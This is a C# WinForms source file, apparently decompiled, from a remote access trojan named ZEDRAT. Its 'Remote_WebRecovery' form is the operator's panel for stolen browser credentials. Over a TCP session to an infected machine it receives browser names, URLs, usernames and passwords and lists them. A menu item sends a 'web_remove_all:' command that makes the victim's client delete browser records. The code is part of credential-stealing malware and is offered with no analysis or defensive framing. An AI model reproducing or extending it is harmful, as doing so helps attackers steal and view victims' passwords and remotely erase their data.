using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;


using Sockets;
using ZEDRAT.Messages;
using ZEDRAT.Module;
using ZEDRAT.TCP;

namespace ZEDRatApp.Forms
{
	public class Remote_WebRecovery : Form
	{
		internal TcpClientSession m_tcs;

		public Remote_Web_Manager _rwm;

		public object ObjStatus = new object();

		public bool Statusing;

		private IContainer components;

		private ListView lvWebRecovery;

		private ColumnHeader hBrowser;

		private ColumnHeader hURL;

		private ColumnHeader hUserName;

		private ColumnHeader hPassword;

		private ContextMenuStrip ctxMenuWebRecovery;

		private ToolStripMenuItem deleteAllHistoryToolStripMenuItem;

		private Guna2GroupBox groupBox1;

		private Guna2HtmlLabel Guna2HtmlLabel12;

		private Guna2ControlBox Guna2ControlBox1;

		private BunifuSeparator bunifuSeparator2;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_WebRecovery(string strWebRecovery, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.m_tcs = tcs;
			this.Text = strWebRecovery;
			this._rwm = new Remote_Web_Manager(this.m_tcs);
			base.FormClosed += new FormClosedEventHandler(Remote_WebRecovery_FormClosed);
		}

		private void SetLastColumnWidth1()
		{
			this.lvWebRecovery.Columns[this.lvWebRecovery.Columns.Count - 1].Width = -2;
		}

		private void Remote_WebRecovery_Load(object sender, EventArgs e)
		{
			this.SetLastColumnWidth1();
			this.lvWebRecovery.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.lvWebRecovery.View = View.Details;
			this.lvWebRecovery.HideSelection = false;
			this.lvWebRecovery.OwnerDraw = true;
			this.lvWebRecovery.BackColor = Color.FromArgb(9, 8, 13);
			this.lvWebRecovery.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(18, 15, 24));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.FromArgb(226, 28, 71));
			};
			this.lvWebRecovery.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.lvWebRecovery.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.m_tcs._Idispatchar.Register(DataType.RemoteOtherType, new Action<TcpClientSession, byte[]>(this._rwm.RemoteWebExecute));
			this._rwm._FormExecute = new Action<string, object>(UpdateRemoteWebRecovery_Form);
		}

		private void Remote_WebRecovery_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.m_tcs?._Idispatchar?.Unregister(DataType.RemoteOtherType);
			this.m_tcs = null;
			this._rwm?.destroy();
			this._rwm = null;
			GC.Collect();
		}

		public void UpdateRemoteWebRecovery_Form(string DateType, object ob)
		{
			try
			{
				lock (this.ObjStatus)
				{
					this.Statusing = false;
				}
				if (DateType != "Status")
				{
					if (DateType == "Refresh")
					{
						base.Invoke((MethodInvoker)delegate
						{
							foreach (RemoteWebList item in ob as List<RemoteWebList>)
							{
								ListViewItem value = new ListViewItem
								{
									Text = item.strWebBrowser,
									SubItems = { item.strUrl, item.strUsername, item.strPassword }
								};
								this.lvWebRecovery.Items.Add(value);
							}
						});
					}
					else if (DateType == "Remove_All")
					{
						base.Invoke((MethodInvoker)delegate
						{
							this.lvWebRecovery.Clear();
						});
					}
				}
				else
				{
					base.Invoke((MethodInvoker)delegate
					{
					});
				}
			}
			catch (Exception)
			{
				base.Invoke((MethodInvoker)delegate
				{
				});
			}
		}

		private void deleteAllHistoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("chrome").Length != 0)
			{
				MessageBox.Show("Please close the Chrome browser to delete all logs.");
			}
			else if (Process.GetProcessesByName("SogouExplorer").Length != 0)
			{
				MessageBox.Show("Please close the Sogou browser to delete all logs.");
			}
			else
			{
				this.m_tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("web_remove_all:"));
			}
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_WebRecovery.ReleaseCapture();
			Remote_WebRecovery.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Remote_WebRecovery_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_WebRecovery.ReleaseCapture();
			Remote_WebRecovery.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																					this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_WebRecovery));
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.lvWebRecovery = new System.Windows.Forms.ListView();
			this.hBrowser = new System.Windows.Forms.ColumnHeader();
			this.hURL = new System.Windows.Forms.ColumnHeader();
			this.hUserName = new System.Windows.Forms.ColumnHeader();
			this.hPassword = new System.Windows.Forms.ColumnHeader();
			this.ctxMenuWebRecovery = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.deleteAllHistoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.groupBox1 = new Guna2GroupBox();
			this.Guna2HtmlLabel12 = new Guna2HtmlLabel();
			this.Guna2ControlBox1 = new Guna2ControlBox();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.ctxMenuWebRecovery.SuspendLayout();
			((System.Windows.Forms.Control)(object)this.groupBox1).SuspendLayout();
			base.SuspendLayout();
			this.lvWebRecovery.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.lvWebRecovery.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.lvWebRecovery.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.hBrowser, this.hURL, this.hUserName, this.hPassword });
			this.lvWebRecovery.ContextMenuStrip = this.ctxMenuWebRecovery;
			this.lvWebRecovery.Dock = System.Windows.Forms.DockStyle.Bottom;
			this.lvWebRecovery.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.lvWebRecovery.ForeColor = System.Drawing.Color.White;
			this.lvWebRecovery.FullRowSelect = true;
			this.lvWebRecovery.HideSelection = false;
			this.lvWebRecovery.Location = new System.Drawing.Point(0, 40);
			this.lvWebRecovery.Name = "lvWebRecovery";
			this.lvWebRecovery.Size = new System.Drawing.Size(863, 410);
			this.lvWebRecovery.TabIndex = 0;
			this.lvWebRecovery.UseCompatibleStateImageBehavior = false;
			this.lvWebRecovery.View = System.Windows.Forms.View.Details;
			this.hBrowser.Text = "Browser name";
			this.hBrowser.Width = 107;
			this.hURL.Text = "URL/location";
			this.hURL.Width = 200;
			this.hUserName.Text = "username";
			this.hUserName.Width = 95;
			this.hPassword.Text = "password";
			this.hPassword.Width = 105;
			this.ctxMenuWebRecovery.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.ctxMenuWebRecovery.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.ctxMenuWebRecovery.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.deleteAllHistoryToolStripMenuItem });
			this.ctxMenuWebRecovery.Name = "ctxMenuWebRecovery";
			this.ctxMenuWebRecovery.ShowImageMargin = false;
			this.ctxMenuWebRecovery.Size = new System.Drawing.Size(158, 26);
			this.deleteAllHistoryToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.deleteAllHistoryToolStripMenuItem.Name = "deleteAllHistoryToolStripMenuItem";
			this.deleteAllHistoryToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
			this.deleteAllHistoryToolStripMenuItem.Text = "Delete all records";
			this.deleteAllHistoryToolStripMenuItem.Click += new System.EventHandler(deleteAllHistoryToolStripMenuItem_Click);
			((System.Windows.Forms.Control)(object)this.groupBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.groupBox1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.groupBox1).Controls.Add(this.lvWebRecovery);
			this.groupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.groupBox1.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.groupBox1).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.groupBox1).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.groupBox1).Location = new System.Drawing.Point(14, 75);
			((System.Windows.Forms.Control)(object)this.groupBox1).Name = "groupBox1";
			this.groupBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.groupBox1;
			((System.Windows.Forms.Control)(object)this.groupBox1).Size = new System.Drawing.Size(863, 450);
			((System.Windows.Forms.Control)(object)this.groupBox1).TabIndex = 41;
			((System.Windows.Forms.Control)(object)this.groupBox1).Text = "Recover Accounts";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Location = new System.Drawing.Point(355, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Name = "Guna2HtmlLabel12";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Size = new System.Drawing.Size(116, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).TabIndex = 43;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Text = "Web Recovery";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.Guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.Guna2ControlBox1.BorderRadius = 12;
			this.Guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Location = new System.Drawing.Point(834, 12);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Name = "Guna2ControlBox1";
			this.Guna2ControlBox1.PressedColor = System.Drawing.Color.Red;
			this.Guna2ControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2ControlBox1;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).TabIndex = 45;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(0, 51);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(7, 2, 7, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(890, 8);
			this.bunifuSeparator2.TabIndex = 85;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(14, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 170;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(891, 535);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2ControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.groupBox1);
			this.Font = new System.Drawing.Font("Century Gothic", 8.25f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.Name = "Remote_WebRecovery";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Remote_WebRecovery";
			base.Load += new System.EventHandler(Remote_WebRecovery_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(Remote_WebRecovery_MouseDown);
			this.ctxMenuWebRecovery.ResumeLayout(false);
			((System.Windows.Forms.Control)(object)this.groupBox1).ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
